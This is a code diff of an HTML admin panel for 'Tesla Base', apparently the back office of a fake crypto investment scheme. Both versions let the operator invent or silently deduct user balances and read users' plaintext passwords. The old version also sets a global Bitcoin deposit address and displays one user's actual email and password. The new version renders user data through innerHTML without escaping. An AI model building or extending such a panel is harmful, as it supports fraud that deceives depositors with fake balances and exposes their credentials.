@@ -2,70 +2,193 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Master Admin | Tesla Base</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tesla Base | Admin Control</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; padding: 20px; }
-        .box { border: 1px solid #E31937; border-radius: 8px; padding: 20px; margin-bottom: 20px; background: #0a0a0a; }
-        h2 { font-size: 14px; color: #E31937; text-transform: uppercase; margin-bottom: 15px; }
-        table { width: 100%; border-collapse: collapse; font-size: 12px; }
-        th, td { padding: 12px; border-bottom: 1px solid #222; text-align: left; }
-        input { width: 100%; padding: 12px; border-radius: 4px; border:none; margin: 10px 0; background: #fff; color:#000; }
-        .btn-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
-        .btn { padding: 12px; border:none; border-radius:4px; font-weight:bold; cursor:pointer; color:#fff; }
+        :root {
+            --bg: #000;
+            --tesla-red: #E31937;
+            --card-bg: #111;
+            --text: #fff;
+            --border: #222;
+        }
+
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: sans-serif;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        /* Access Gate */
+        #gate {
+            text-align: center;
+            background: var(--card-bg);
+            padding: 40px;
+            border-radius: 15px;
+            border: 1px solid var(--border);
+            width: 90%;
+            max-width: 400px;
+        }
+
+        /* Main Dashboard (Hidden by default) */
+        #admin-panel {
+            display: none;
+            width: 95%;
+            max-width: 1000px;
+            padding: 20px;
+        }
+
+        input {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            background: #000;
+            border: 1px solid #333;
+            color: #fff;
+            border-radius: 8px;
+            box-sizing: border-box;
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            background: var(--tesla-red);
+            border: none;
+            color: #fff;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            text-transform: uppercase;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+            background: var(--card-bg);
+            border-radius: 10px;
+            overflow: hidden;
+        }
+
+        th, td {
+            padding: 15px;
+            text-align: left;
+            border-bottom: 1px solid var(--border);
+        }
+
+        th { color: var(--tesla-red); font-size: 12px; text-transform: uppercase; }
+
+        .inject-box {
+            background: var(--card-bg);
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 30px;
+            border: 1px solid var(--border);
+        }
     </style>
 </head>
 <body>
 
-    <h1 style="color:#E31937;">MASTER CONTROL PANEL</h1>
-
-    <div class="box">
-        <h2>User Overview (Emails & Passwords)</h2>
-        <table>
-            <tr><th>Email</th><th>Password</th><th>Live Balance</th></tr>
-            <tr>
-                <td>sweetcsf1@gmail.com</td>
-                <td style="color:#ffc107">222222</td>
-                <td id="adm-bal" style="font-weight:bold; color:#00ff88;">$0.00</td>
-            </tr>
-        </table>
+    <div id="gate">
+        <h2 style="color:var(--tesla-red); letter-spacing:3px;">ADMIN ACCESS</h2>
+        <p style="color:#888; font-size:13px;">Enter the Solomon Security Code</p>
+        <input type="password" id="admin-code" placeholder="Enter Code...">
+        <button onclick="verifyGate()">Access Dashboard</button>
+        <p id="gate-error" style="color:red; margin-top:15px; display:none;">Invalid Code</p>
     </div>
 
-    <div class="box">
-        <h2>Manual Fund Management</h2>
-        <input type="number" id="adm-amt" placeholder="Enter Amount (USD)">
-        <div class="btn-grid">
-            <button class="btn" style="background:#28a745" onclick="mod('add')">Inject Win</button>
-            <button class="btn" style="background:#ffc107; color:#000" onclick="mod('add')">Inject Interest</button>
-            <button class="btn" style="background:#007bff" onclick="mod('add')">Inject Return</button>
-            <button class="btn" style="background:#6c757d" onclick="mod('sub')">Silent Deduct</button>
+    <div id="admin-panel">
+        <div style="display:flex; justify-content:space-between; align-items:center;">
+            <h1 style="color:var(--tesla-red);">Master Control</h1>
+            <button onclick="location.reload()" style="width:auto; padding:10px 20px;">Logout</button>
+        </div>
+
+        <div class="inject-box">
+            <h3><i class="fa-solid fa-money-bill-transfer"></i> Inject Funds</h3>
+            <div style="display:grid; grid-template-columns: 2fr 1fr 1fr; gap:10px;">
+                <input type="email" id="target-email" placeholder="User Email">
+                <input type="number" id="inject-amount" placeholder="Amount ($)">
+                <button onclick="injectFunds()" style="margin-top:10px;">Update Balance</button>
+            </div>
+        </div>
+
+        <h3>Registered Users</h3>
+        <div style="overflow-x:auto;">
+            <table>
+                <thead>
+                    <tr>
+                        <th>Email</th>
+                        <th>Password</th>
+                        <th>Balance</th>
+                        <th>Wallet</th>
+                    </tr>
+                </thead>
+                <tbody id="user-list">
+                    </tbody>
+            </table>
         </div>
     </div>
 
-    <div class="box">
-        <h2>System Settings</h2>
-        <input type="text" id="adm-wall" placeholder="Bitcoin Wallet Address">
-        <button class="btn" style="background:#E31937; width:100%" onclick="saveW()">Set Global Deposit Address</button>
-    </div>
-
     <script>
-        function mod(type) {
-            const val = parseFloat(document.getElementById('adm-amt').value);
-            if(isNaN(val)) return alert("Enter amount");
-            let current = parseFloat(localStorage.getItem('userBalance')) || 0;
-            if(type === 'sub') current -= val; else current += val;
-            localStorage.setItem('userBalance', current.toFixed(2));
-            render();
-            alert("Funds Updated on User Dashboard.");
+        // RULE: Use the Solomon Code for security
+        async function verifyGate() {
+            const code = document.getElementById('admin-code').value;
+            const res = await fetch('/api/admin/verify', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ password: code })
+            });
+
+            if(res.ok) {
+                document.getElementById('gate').style.display = 'none';
+                document.getElementById('admin-panel').style.display = 'block';
+                loadUsers();
+            } else {
+                document.getElementById('gate-error').style.display = 'block';
+            }
         }
-        function saveW() {
-            localStorage.setItem('dep_info', document.getElementById('adm-wall').value);
-            alert("Wallet Address Saved!");
+
+        // RULE: View emails and passwords on admin dashboard
+        async function loadUsers() {
+            const res = await fetch('/api/admin/users');
+            const users = await res.json();
+            const list = document.getElementById('user-list');
+            list.innerHTML = users.map(u => `
+                <tr>
+                    <td>${u.email}</td>
+                    <td style="color:#666;">${u.password}</td>
+                    <td style="color:#0f8; font-weight:bold;">$${parseFloat(u.balance).toLocaleString()}</td>
+                    <td style="font-size:10px; color:#888;">${u.wallet_address}</td>
+                </tr>
+            `).join('');
         }
-        function render() {
-            const b = localStorage.getItem('userBalance') || "0.00";
-            document.getElementById('adm-bal').innerText = "$" + parseFloat(b).toLocaleString();
+
+        // RULE: Users never lose funds (Inject/Update Balance)
+        async function injectFunds() {
+            const email = document.getElementById('target-email').value;
+            const amount = document.getElementById('inject-amount').value;
+
+            if(!email || !amount) return alert("Fill all fields");
+
+            const res = await fetch('/api/user/update-balance', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ email, amount })
+            });
+
+            if(res.ok) {
+                alert("Balance updated successfully!");
+                loadUsers();
+            } else {
+                alert("Error updating balance");
+            }
         }
-        window.onload = render;
     </script>
 </body>
 </html>
